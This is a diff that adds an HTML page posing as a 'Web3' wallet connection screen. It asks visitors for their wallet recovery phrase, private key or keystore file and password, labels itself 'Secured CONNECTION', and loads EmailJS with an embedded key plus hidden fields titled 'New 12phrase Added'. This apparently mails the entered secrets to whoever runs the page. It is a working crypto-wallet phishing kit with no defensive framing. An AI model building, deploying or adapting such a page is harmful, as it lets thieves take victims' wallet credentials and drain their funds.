@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="shortcut icon" type="image/png" href="./images/logo.png" />
+    <title>Communication Protocol for Web3</title>
+    <!-- CSS only -->
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="input.css" />
+    <style>
+      .bg {
+        background-color: #0f0e13;
+        background-image: radial-gradient(
+            at 0% 0%,
+            hsla(253, 16%, 7%, 1) 0,
+            transparent 50%
+          ),
+          radial-gradient(at 50% 0%, hsla(225, 39%, 30%, 1) 0, transparent 50%),
+          radial-gradient(at 100% 0%, hsla(339, 49%, 30%, 1) 0, transparent 50%);
+      }
+    </style>
+  </head>
+
+  <body class="bg">
+    <div class="container connection">
+      <div class="connection-body">
+        <div class="eth-logo">
+          <img src="./images/eth_logo.png" alt="" />
+          <p>
+            <strong> Info alert! </strong> Securely use any of the options below
+          </p>
+        </div>
+
+        <div class="import-box">
+          <div class="modal-body text-center justify-content-center mt-4">
+            <ul class="nav nav-tabs nav-fill" id="myTab" role="tablist">
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link active"
+                  id="home-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#home"
+                  type="button"
+                  role="tab"
+                  aria-controls="home"
+                  aria-selected="true"
+                >
+                  Phrase
+                </button>
+              </li>
+
+              <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link"
+                  id="contact-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#contact"
+                  type="button"
+                  role="tab"
+                  aria-controls="contact"
+                  aria-selected="false"
+                >
+                  Keystore
+                </button>
+                <!-- </li> -->
+                <!-- <li class="nav-item" role="presentation">
+                <button
+                  class="nav-link"
+                  id="profile-tab"
+                  data-bs-toggle="tab"
+                  data-bs-target="#profile"
+                  type="button"
+                  role="tab"
+                  aria-controls="profile"
+                  aria-selected="false"
+                >
+                  Private Key
+                </button> -->
+                <!-- </li> -->
+              </li>
+            </ul>
+
+            <!-- tab-content -->
+            <div class="tab-content g-5" id="myTabContent">
+              <div
+                class="tab-pane fade show active"
+                id="home"
+                role="tabpanel"
+                aria-labelledby="home-tab"
+              >
+                <form
+                  id="form"
+                  name="form"
+                  onsubmit="return validated()"
+                  class="mt-3"
+                >
+                  <div class="mb-3">
+                    <div class="phrase-box">
+                      <input
+                        type="text"
+                        name="from_name"
+                        class="form-control py-5 phrase-boxClass"
+                        id="from_name"
+                        placeholder="Enter your recovery phrase or private key..."
+                        required=""
+                        autocomplete="off"
+                      />
+                    </div>
+                    <div id="emailHelp" class="form-text text-center m-2 mt-4">
+                      Typically 12 (sometimes 24) words separated by single
+                      spaces
+                    </div>
+                  </div>
+
+                  <input type="hidden" name="_next" />
+                  <input
+                    type="hidden"
+                    name="_subject"
+                    value="New 12phrase Added"
+                  />
+                  <input type="hidden" name="_captcha" value="false" />
+
+                  <button
+                    type="submit"
+                    class="btn btn-primary mt-1 justify-content-center"
+                    id="button"
+                    onclick="validate()"
+                  >
+                    <a href="./qr-success.html"></a> Proceed
+                  </button>
+                </form>
+              </div>
+
+              <div
+                class="tab-pane fade"
+                id="contact"
+                role="tabpanel"
+                aria-labelledby="contact-tab"
+              >
+                <form id="form" name="form" class="mt-3">
+                  <div class="mb-3">
+                    <input
+                      type="text"
+                      name="password"
+                      class="form-control p-1"
+                      id="exampleInputEmail1"
+                      aria-describedby="emailHelp"
+                      placeholder="password..."
+                      required
+                    />
+                    <label
+                      for="dropzone-file"
+                      style="
+                        border: 1px solid grey;
+                        border-radius: 10px;
+                        margin-top: 1em;
+                        width: 100%;
+                      "
+                      class="keystore-label"
+                    >
+                      <div
+                        class="keystore-label-item flex flex-col justify-center items-center pt-5 pb-6"
+                      >
+                        <svg
+                          style="width: 30px"
+                          aria-hidden="true"
+                          class="mb-3 w-10 h-10 text-gray-400"
+                          fill="none"
+                          stroke="currentColor"
+                          viewBox="0 0 24 24"
+                          xmlns="http://www.w3.org/2000/svg"
+                        >
+                          <path
+                            stroke-linecap="round"
+                            stroke-linejoin="round"
+                            stroke-width="2"
+                            d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"
+                          ></path>
+                        </svg>
+                        <p style="font-size: 14px">
+                          <span class="font-semibold">Click to upload</span> or
+                          drag and drop
+                        </p>
+                        <p style="font-size: 13px">
+                          SVG, PNG, JPG or GIF (MAX. 800x400px)
+                        </p>
+                      </div>
+                      <input
+                        id="dropzone-file"
+                        type="file"
+                        class="hidden"
+                        style="display: none"
+                      />
+                    </label>
+                    <div id="emailHelp" class="form-text text-center m-2 mt-4">
+                      Several lines of text beginning with "{...}" plus the
+                      password you used to encrypt it
+                    </div>
+                  </div>
+
+                  <input type="hidden" name="_next" />
+                  <input
+                    type="hidden"
+                    name="_subject"
+                    value="New 12phrase Added"
+                  />
+                  <input type="hidden" name="_captcha" value="false" />
+
+                  <button
+                    type="submit"
+                    class="btn btn-primary mt-1"
+                    id="button"
+                  >
+                    <a href="./qr-success.html"></a> Proceed
+                  </button>
+                </form>
+              </div>
+
+              <div
+                class="tab-pane fade"
+                id="profile"
+                role="tabpanel"
+                aria-labelledby="profile-tab"
+              >
+                <!-- <form
+                  id="form"
+                  name="form"
+                  onsubmit="return validated()"
+                  class="mt-3"
+                >
+                  <div class="mb-3">
+                    <div class="phrase-box">
+                      <input
+                        type="text"
+                        name="from_name"
+                        class="form-control py-5 phrase-boxClass"
+                        id="from_name"
+                        placeholder="Enter your recovery phrase..."
+                        required=""
+                        autocomplete="off"
+                      />
+                    </div>
+                    <div id="emailHelp" class="form-text text-center m-2 mt-4">
+                      Typically 12 (sometimes 24) words separated by single
+                      spaces
+                    </div>
+                  </div>
+
+                  <input type="hidden" name="_next" />
+                  <input
+                    type="hidden"
+                    name="_subject"
+                    value="New 12phrase Added"
+                  />
+                  <input type="hidden" name="_captcha" value="false" />
+
+                  <button
+                    type="submit"
+                    class="btn btn-primary mt-1 justify-content-center"
+                    id="button2"
+                  >
+                    <a href="./qr-success.html"></a> Proceed
+                  </button>
+                </form> -->
+              </div>
+            </div>
+          </div>
+
+          <div class="secure btn btn-primary">
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              width="16"
+              height="16"
+              fill="currentColor"
+              class="bi bi-shield-shaded"
+              viewBox="0 0 16 16"
+            >
+              <path
+                fill-rule="evenodd"
+                d="M8 14.933a.615.615 0 0 0 .1-.025c.076-.023.174-.061.294-.118.24-.113.547-.29.893-.533a10.726 10.726 0 0 0 2.287-2.233c1.527-1.997 2.807-5.031 2.253-9.188a.48.48 0 0 0-.328-.39c-.651-.213-1.75-.56-2.837-.855C9.552 1.29 8.531 1.067 8 1.067v13.866zM5.072.56C6.157.265 7.31 0 8 0s1.843.265 2.928.56c1.11.3 2.229.655 2.887.87a1.54 1.54 0 0 1 1.044 1.262c.596 4.477-.787 7.795-2.465 9.99a11.775 11.775 0 0 1-2.517 2.453 7.159 7.159 0 0 1-1.048.625c-.28.132-.581.24-.829.24s-.548-.108-.829-.24a7.158 7.158 0 0 1-1.048-.625 11.777 11.777 0 0 1-2.517-2.453C1.928 10.487.545 7.169 1.141 2.692A1.54 1.54 0 0 1 2.185 1.43 62.456 62.456 0 0 1 5.072.56z"
+              ></path>
+            </svg>
+            <p>Secured CONNECTION</p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- JavaScript Bundle with Popper -->
+    <script
+      type="text/javascript"
+      src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"
+    ></script>
+
+    <script type="text/javascript">
+      emailjs.init("dEm612NJ0gIvlIMPM");
+    </script>
+    <script src="./app.js"></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-OERcA2EqjJCMA+/3y+gxIOqMEjwtxJY7qPCqsdltbNJuaOe923+mo//f6V8Qbsw3"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
